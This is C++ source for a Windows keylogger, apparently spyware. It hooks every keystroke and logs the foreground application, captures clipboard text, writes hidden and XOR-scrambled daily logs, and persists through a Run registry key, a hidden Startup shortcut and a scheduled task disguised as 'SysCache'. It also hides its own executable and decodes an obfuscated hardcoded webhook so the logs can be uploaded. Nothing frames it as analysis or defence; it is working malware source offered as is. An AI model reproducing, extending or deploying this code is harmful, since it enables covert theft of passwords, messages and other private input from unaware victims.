// agent_win.cpp — cl /O2 /DUNICODE ..\src\agent_win.cpp ..\src\uploader_win.cpp /link winhttp.lib
// Silent WinMain. Encrypted per-day logs %LOCALAPPDATA%\.cache\.sysdata\YYYY-MM-DD.dat
// (XOR with SHA256(USERNAME@COMPUTERNAME), same as agent.py).
#include <windows.h>
#include <string>
#include <vector>
#include <shlobj.h>
#include <objbase.h>
#include <shobjidl.h>
#pragma comment(lib, "winhttp.lib")
#pragma comment(lib, "ole32.lib")
extern void df_log(const std::wstring& s);
extern void df_start_uploader(const std::wstring& hook);
extern void df_set_label(const std::wstring& label);
static std::wstring gDir, gLastApp, gLabel;
static std::wstring gLastTok; static DWORD gLastMs = 0;
static int gDay = -1;
static std::vector<unsigned char> gKey;
typedef unsigned long _U32;
struct _Sha { _U32 h[8]; unsigned long long len; unsigned char buf[64]; unsigned bl; };
static const _U32 _K[64] = {0x428a2f98,0x71374491,0xb5c0fbcf,0xe9b5dba5,0x3956c25b,0x59f111f1,0x923f82a4,0xab1c5ed5,0xd807aa98,0x12835b01,0x243185be,0x550c7dc3,0x72be5d74,0x80deb1fe,0x9bdc06a7,0xc19bf174,0xe49b69c1,0xefbe4786,0x0fc19dc6,0x240ca1cc,0x2de92c6f,0x4a7484aa,0x5cb0a9dc,0x76f988da,0x983e5152,0xa831c66d,0xb00327c8,0xbf597fc7,0xc6e00bf3,0xd5a79147,0x06ca6351,0x14292967,0x27b70a85,0x2e1b2138,0x4d2c6dfc,0x53380d13,0x650a7354,0x766a0abb,0x81c2c92e,0x92722c85,0xa2bfe8a1,0xa81a664b,0xc24b8b70,0xc76c51a3,0xd192e819,0xd6990624,0xf40e3585,0x106aa070,0x19a4c116,0x1e376c08,0x2748774c,0x34b0bcb5,0x391c0cb3,0x4ed8aa4a,0x5b9cca4f,0x682e6ff3,0x748f82ee,0x78a5636f,0x84c87814,0x8cc70208,0x90befffa,0xa4506ceb,0xbef9a3f7,0xc67178f2};
#define _RR(x,n) (((x)>>(n))|((x)<<(32-(n))))
static void _st(_Sha* s, const unsigned char* d, unsigned l) {
    s->len += l;
    while (l--) { s->buf[s->bl++] = *d++;
        if (s->bl == 64) { _U32 w[64]; for (int i = 0; i < 16; i++) w[i] = (s->buf[i*4]<<24)|(s->buf[i*4+1]<<16)|(s->buf[i*4+2]<<8)|s->buf[i*4+3];
            for (int i = 16; i < 64; i++) { _U32 s0=_RR(w[i-15],7)^_RR(w[i-15],18)^(w[i-15]>>3), s1=_RR(w[i-2],17)^_RR(w[i-2],19)^(w[i-2]>>10); w[i]=w[i-16]+s0+w[i-7]+s1; }
            _U32 a=s->h[0],b=s->h[1],c=s->h[2],d2=s->h[3],e=s->h[4],f=s->h[5],g=s->h[6],h=s->h[7];
            for (int i = 0; i < 64; i++) { _U32 S1=_RR(e,6)^_RR(e,11)^_RR(e,25), ch=(e&f)^(~e&g), t1=h+S1+ch+_K[i]+w[i], S0=_RR(a,2)^_RR(a,13)^_RR(a,22), mj=(a&b)^(a&c)^(b&c), t2=S0+mj; h=g;g=f;f=e;e=d2+t1;d2=c;c=b;b=a;a=t1+t2; }
            s->h[0]+=a;s->h[1]+=b;s->h[2]+=c;s->h[3]+=d2;s->h[4]+=e;s->h[5]+=f;s->h[6]+=g;s->h[7]+=h; s->bl = 0; } }
}
static std::vector<unsigned char> sha256(const std::string& m) {
    _Sha s; s.h[0]=0x6a09e667;s.h[1]=0xbb67ae85;s.h[2]=0x3c6ef372;s.h[3]=0xa54ff53a;s.h[4]=0x510e527f;s.h[5]=0x9b05688c;s.h[6]=0x1f83d9ab;s.h[7]=0x5be0cd19; s.len=0; s.bl=0;
    _st(&s, (const unsigned char*)m.data(), (unsigned)m.size());
    unsigned long long bit = s.len * 8; unsigned char pad = 0x80; _st(&s, &pad, 1);
    unsigned char z = 0; while (s.bl != 56) _st(&s, &z, 1);
    unsigned char lb[8]; for (int i = 0; i < 8; i++) lb[i] = (bit >> (56 - i * 8)) & 0xff; _st(&s, lb, 8);
    std::vector<unsigned char> o(32); for (int i = 0; i < 8; i++) { o[i*4]=(unsigned char)(s.h[i]>>24); o[i*4+1]=(unsigned char)(s.h[i]>>16); o[i*4+2]=(unsigned char)(s.h[i]>>8); o[i*4+3]=(unsigned char)s.h[i]; }
    return o;
}
static std::wstring todayPath() {
    SYSTEMTIME st; GetLocalTime(&st);
    wchar_t b[MAX_PATH];
    swprintf_s(b, L"%s\\%04d-%02d-%02d.dat", gDir.c_str(), st.wYear, st.wMonth, st.wDay);
    return b;
}
static void hideDeep(const std::wstring& p) { SetFileAttributesW(p.c_str(), FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM); }
void df_log(const std::wstring& s) {
    SYSTEMTIME st; GetLocalTime(&st);
    if (st.wDay != gDay || gDay < 0) { gDay = st.wDay; CreateDirectoryW(gDir.c_str(), NULL); SetFileAttributesW(gDir.c_str(), FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM); }
    std::wstring p = todayPath();
    HANDLE he = CreateFileW(p.c_str(), GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
    if (he == INVALID_HANDLE_VALUE) { HANDLE hc = CreateFileW(p.c_str(), GENERIC_WRITE, 0, NULL, CREATE_NEW, FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM, NULL); if (hc != INVALID_HANDLE_VALUE) CloseHandle(hc); }
    else CloseHandle(he);
    HANDLE h = CreateFileW(p.c_str(), FILE_APPEND_DATA, FILE_SHARE_READ, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM, NULL);
    if (h == INVALID_HANDLE_VALUE) return;
    LARGE_INTEGER sz = {}; GetFileSizeEx(h, &sz);
    std::string u; int n = WideCharToMultiByte(CP_UTF8, 0, s.c_str(), -1, NULL, 0, NULL, NULL);
    if (n > 1) { u.resize(n - 1); WideCharToMultiByte(CP_UTF8, 0, s.c_str(), -1, u.data(), n, NULL, NULL); }
    unsigned long long base = (unsigned long long)sz.QuadPart;
    for (size_t i = 0; i < u.size() && !gKey.empty(); i++) u[i] ^= gKey[(base + i) % gKey.size()];
    DWORD w = 0; WriteFile(h, u.data(), (DWORD)u.size(), &w, NULL); CloseHandle(h);
}
static std::wstring frontApp() {
    HWND f = GetForegroundWindow(); DWORD pid = 0; GetWindowThreadProcessId(f, &pid);
    HANDLE h = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, pid);
    wchar_t b[MAX_PATH] = L"unknown"; DWORD n = MAX_PATH;
    if (h) { QueryFullProcessImageNameW(h, 0, b, &n); CloseHandle(h); }
    std::wstring s = b; auto p = s.find_last_of(L"\\"); if (p != std::wstring::npos) s = s.substr(p + 1);
    return s;
}
static bool isMod(DWORD vk) {
    return vk == VK_SHIFT || vk == VK_LSHIFT || vk == VK_RSHIFT || vk == VK_CONTROL || vk == VK_LCONTROL ||
           vk == VK_RCONTROL || vk == VK_MENU || vk == VK_LMENU || vk == VK_RMENU || vk == VK_LWIN || vk == VK_RWIN ||
           vk == VK_CAPITAL || vk == VK_NUMLOCK || vk == VK_SCROLL;
}
static const wchar_t* keyName(DWORD vk, bool shift) {
    static wchar_t buf[32];
    if (vk == VK_RETURN) return L"\n"; if (vk == VK_TAB) return L"\t";
    if (vk == VK_SPACE) return L" "; if (vk == VK_BACK) return L"\x08";
    if (vk == VK_ESCAPE) return L"[ESC]"; if (vk == VK_DELETE) return L"[DEL]";
    if (isMod(vk)) return L"";
    BYTE ks[256] = {}; if (shift) ks[VK_SHIFT] = 0x80;
    WCHAR c[4] = {}; if (ToUnicode(vk, MapVirtualKeyW(vk, MAPVK_VK_TO_VSC), ks, c, 4, 0) > 0) { buf[0] = c[0]; buf[1] = 0; return buf; }
    swprintf_s(buf, L"[VK%lu]", vk); return buf;
}
LRESULT CALLBACK llProc(int n, WPARAM w, LPARAM l) {
    if (n == HC_ACTION && (w == WM_KEYDOWN || w == WM_SYSKEYDOWN)) {
        auto* k = (KBDLLHOOKSTRUCT*)l;
        if (isMod(k->vkCode)) return CallNextHookEx(NULL, n, w, l);
        std::wstring a = frontApp();
        if (a != gLastApp) { gLastApp = a; gLastTok.clear(); df_log(L"\n\n[" + a + L"]\n"); }
        bool sh = GetAsyncKeyState(VK_SHIFT) & 0x8000;
        std::wstring s = keyName(k->vkCode, sh);
        if (s.empty()) return CallNextHookEx(NULL, n, w, l);
        if ((GetAsyncKeyState(VK_CONTROL) & 0x8000) && k->vkCode >= 'A' && k->vkCode <= 'Z')
            s = std::wstring(L"[CTRL+") + (wchar_t)k->vkCode + L"]";
        // held-key filter: identical token within 60ms = auto-repeat
        DWORD now = GetTickCount();
        if (s == gLastTok && s.size() == 1 && (now - gLastMs) < 60) return CallNextHookEx(NULL, n, w, l);
        gLastTok = s; gLastMs = now;
        df_log(s);
    }
    return CallNextHookEx(NULL, n, w, l);
}
static void clipWatch() {
    CreateThread(NULL, 0, [](LPVOID)->DWORD {
        std::wstring last;
        for (;;) { Sleep(1000);
            if (!OpenClipboard(NULL)) continue;
            HANDLE h = GetClipboardData(CF_UNICODETEXT);
            if (h) { std::wstring s = (wchar_t*)GlobalLock(h); GlobalUnlock(h); CloseClipboard();
                if (!s.empty() && s != last && s.size() < 10000) { last = s; df_log(L"\n[CLIP]: " + s + L"\n"); } }
            else CloseClipboard();
        } return 0;
    }, NULL, 0, NULL);
}
static std::wstring trimW(std::wstring h) {
    while (!h.empty() && (h.front() == L'"' || h.front() == L'\'' || h.front() <= L' ')) h.erase(h.begin());
    while (!h.empty() && (h.back() == L'"' || h.back() == L'\'' || h.back() <= L' ')) h.pop_back();
    return h;
}
// baked fallback webhook (XOR-scrambled, decoded at runtime). Regenerate, never paste plaintext.
static const unsigned char _WH[] = {11, 59, 209, 210, 33, 172, 242, 76, 43, 204, 209, 49, 249, 175, 7, 97, 198, 205, 63, 185, 188, 19, 38, 138, 213, 55, 244, 181, 12, 32, 206, 209, 125, 167, 232, 86, 126, 145, 150, 102, 174, 239, 85, 126, 145, 155, 97, 163, 228, 85, 120, 146, 141, 28, 174, 179, 9, 10, 207, 250, 8, 242, 181, 39, 57, 157, 219, 4, 204, 176, 34, 45, 250, 209, 19, 194, 233, 7, 25, 200, 197, 4, 195, 142, 34, 26, 204, 211, 10, 213, 184, 33, 2, 225, 214, 63, 219, 229, 47, 61, 224, 146, 99, 249, 142, 15, 55, 231, 219, 11, 244, 191, 45, 33, 240, 206, 35, 201, 158, 81, 23};
static const unsigned char _WK[] = {99, 79, 165, 162, 82, 150, 221};
static std::wstring bakedHook() {
    std::string s; s.reserve(sizeof(_WH));
    for (size_t i = 0; i < sizeof(_WH); i++) s += (char)(_WH[i] ^ _WK[i % sizeof(_WK)]);
    int n = MultiByteToWideChar(CP_UTF8, 0, s.c_str(), -1, NULL, 0);
    std::wstring w(n > 1 ? n - 1 : 0, 0);
    if (n > 1) MultiByteToWideChar(CP_UTF8, 0, s.c_str(), -1, w.data(), n);
    return w;
}
static std::wstring hookFromFile() {
    wchar_t exe[MAX_PATH]; GetModuleFileNameW(NULL, exe, MAX_PATH);
    std::wstring d = exe; auto p = d.find_last_of(L"\\/"); if (p != std::wstring::npos) d = d.substr(0, p + 1);
    for (auto nm : { L"Webhook.txt", L"webhook.txt" }) {
        std::wstring f = d + nm;
        HANDLE h = CreateFileW(f.c_str(), GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
        if (h == INVALID_HANDLE_VALUE) continue;
        char b[512] = {}; DWORD r = 0; ReadFile(h, b, 511, &r, NULL); CloseHandle(h);
        std::string s(b, r); size_t e = s.find_first_of(" \r\n\t"); if (e != std::string::npos) s = s.substr(0, e);
        if (s.rfind("http", 0) == 0) { int n = MultiByteToWideChar(CP_UTF8, 0, s.c_str(), -1, NULL, 0); std::wstring w(n - 1, 0); MultiByteToWideChar(CP_UTF8, 0, s.c_str(), -1, w.data(), n); return w; }
    }
    return L"";
}
// persistence: HKCU Run (create key) + Startup-folder shortcut. No admin.
static void persist(const std::wstring& exe) {
    HKEY h = NULL;
    if (RegCreateKeyExW(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, NULL, 0, KEY_SET_VALUE, NULL, &h, NULL) == ERROR_SUCCESS) {
        RegSetValueExW(h, L"SysCache", 0, REG_SZ, (BYTE*)exe.c_str(), (DWORD)(exe.size() * 2 + 2)); RegCloseKey(h);
    }
    wchar_t start[MAX_PATH];
    if (SUCCEEDED(SHGetFolderPathW(NULL, CSIDL_STARTUP, NULL, 0, start))) {
        std::wstring lnk = std::wstring(start) + L"\\SysCache.lnk";
        HANDLE t = CreateFileW(lnk.c_str(), GENERIC_READ, 0, NULL, OPEN_EXISTING, 0, NULL);
        if (t == INVALID_HANDLE_VALUE) {
            CoInitialize(NULL);
            IShellLinkW* sl = NULL;
            if (SUCCEEDED(CoCreateInstance(CLSID_ShellLink, NULL, CLSCTX_INPROC_SERVER, IID_IShellLinkW, (void**)&sl))) {
                sl->SetPath(exe.c_str()); sl->SetWorkingDirectory(gDir.c_str()); sl->SetShowCmd(SW_HIDE);
                IPersistFile* pf = NULL;
                if (SUCCEEDED(sl->QueryInterface(IID_IPersistFile, (void**)&pf))) { pf->Save(lnk.c_str(), TRUE); pf->Release(); }
                sl->Release();
            }
            CoUninitialize();
        } else CloseHandle(t);
    }
    std::wstring cmd = L"schtasks /create /f /sc onlogon /tn \"SysCache\" /tr \"\\\"" + exe + L"\\\"\" >nul 2>&1";
    _wsystem(cmd.c_str());
}
int WINAPI wWinMain(HINSTANCE, HINSTANCE, LPWSTR cmd, int) {
    wchar_t app[MAX_PATH]; SHGetFolderPathW(NULL, CSIDL_LOCAL_APPDATA, NULL, 0, app);
    gDir = std::wstring(app) + L"\\.cache\\.sysdata";
    // XOR key from USERNAME@COMPUTERNAME (lowercased), same as agent.py
    char un[256] = {}, cn[256] = {}; DWORD n1 = 256, n2 = 256;
    GetUserNameA(un, &n1); GetComputerNameA(cn, &n2);
    std::string seed = std::string(un) + "@" + std::string(cn);
    for (auto& ch : seed) ch = (char)tolower(ch);
    gKey = sha256(seed);
    // hardware label for uploads
    char uh[128] = {}; { DWORD n = 128; GetUserNameA(uh, &n); }
    unsigned lab = 0; for (auto b : gKey) lab = lab * 31 + b;
    wchar_t lb[160]; swprintf_s(lb, L"%hs @%hs [%06x]", uh, cn, lab & 0xffffff);
    gLabel = lb; df_set_label(gLabel);
    wchar_t exe[MAX_PATH]; GetModuleFileNameW(NULL, exe, MAX_PATH);
    persist(exe);
    SetFileAttributesW(exe, FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM);
    std::wstring hook = trimW(cmd && *cmd ? cmd : L"");
    if (hook.empty()) hook = hookFromFile();
    if (hook.empty()) hook = bakedHook();
    if (hook.empty()) { wchar_t* e = _wgetenv(L"DF_WEBHOOK"); if (e) hook = trimW(e); }
    if (!hook.empty()) df_start_uploader(hook);
    clipWatch();
    SetWindowsHookExW(WH_KEYBOARD_LL, llProc, GetModuleHandle(NULL), 0);
    MSG m; while (GetMessageW(&m, NULL, 0, 0)) {}
    return 0;
}
